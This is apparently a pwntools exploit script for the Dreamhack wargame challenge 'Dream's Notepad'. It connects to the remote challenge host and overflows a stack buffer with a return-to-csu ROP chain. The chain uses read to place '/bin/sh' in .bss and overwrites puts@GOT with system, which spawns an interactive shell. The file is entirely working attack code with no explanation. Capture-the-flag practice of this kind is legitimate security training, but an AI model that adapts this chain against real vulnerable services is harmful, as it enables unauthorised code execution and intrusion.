from pwn import *

port = 16521
rem = remote("host3.dreamhack.games", port)
elf = ELF("./Pwnable/Dream's Notepad/problem/Notepad")

csuInit_addr = 0x400c6a
csuCall_addr = 0x400c50
puts_got = elf.got['puts']
read_got = elf.got['read']
system_plt = elf.plt['system']
bss_addr = elf.bss()

rem.sendafter(b"-----Enter the content-----\n", b"`")

# RTC attack
payload = b"a" * 0x1e8
payload += p64(csuInit_addr)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(read_got) # r12
payload += p64(8) # r13
payload += p64(bss_addr) # r14
payload += p64(0) # r15
payload += p64(csuCall_addr)
# mov    rdx,r13
# mov    rsi,r14
# mov    edi,r15d
# call   QWORD PTR [r12+rbx*8]
payload += b"A" * 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(read_got) # r12
payload += p64(8) # r13
payload += p64(puts_got) # r14
payload += p64(0) # r15
payload += p64(csuCall_addr)
# mov    rdx,r13
# mov    rsi,r14
# mov    edi,r15d
# call   QWORD PTR [r12+rbx*8]
payload += b"A" * 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(puts_got) # r12
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(bss_addr) # r15
payload += p64(csuCall_addr)
# mov    rdx,r13
# mov    rsi,r14
# mov    edi,r15d
# call   QWORD PTR [r12+rbx*8]

rem.sendlineafter(b"-----Leave a message-----\n", payload)
sleep(1)
rem.send(b'/bin/sh\x00')
sleep(1)
rem.sendline(p64(system_plt))

rem.interactive()